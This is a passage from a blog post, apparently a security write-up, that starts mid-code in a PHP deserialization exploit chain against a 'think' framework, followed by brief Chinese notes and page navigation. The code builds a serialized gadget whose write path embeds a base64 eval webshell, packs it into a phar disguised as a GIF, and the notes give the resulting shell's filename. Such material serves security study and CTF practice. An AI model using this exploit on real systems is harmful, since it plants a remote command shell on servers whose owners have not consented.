class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span> = <span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">#$this-&gt;options[&#x27;path&#x27;] = &#x27;uploads/aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/&#x27;;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/resource=/var/www/html/public/aPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../uploads/&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">data</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Process</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$data</span>));</span><br><span class="line">    </span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$data</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.gif&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">任意写文件:</span><br><span class="line">1.File类的变量$this-&gt;options[&#39;path&#39;]控制写入文件的目录，目录中有一部分是shell(post ccc)，后面会被写到文件中</span><br><span class="line">注：路径最好是绝对路径，对于php析构函数来说，有时候工作目录会与正常不同，例如apache服务器，php析构函数的工作目录在根目录</span><br><span class="line">2.生成shell的文件名构成为 md5(&#39;tag_&#39; . md5($this-&gt;tag)),按照上面给出的tag，生成的shell文件名应该是</span><br><span class="line">12ac95f1498ce51d2d96a249c09c1998.php</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-待续。。。"><a href="#0x02-待续。。。" class="headerlink" title="0x02 待续。。。"></a>0x02 待续。。。</h3>
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    nodejs原型链污染
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2021/09/18/RCTF2021-ns-shaft-sql/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">(RCTF2021)ns_shaft_sql</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            npC4t &copy; 2021 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a target="_blank" rel="noopener" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
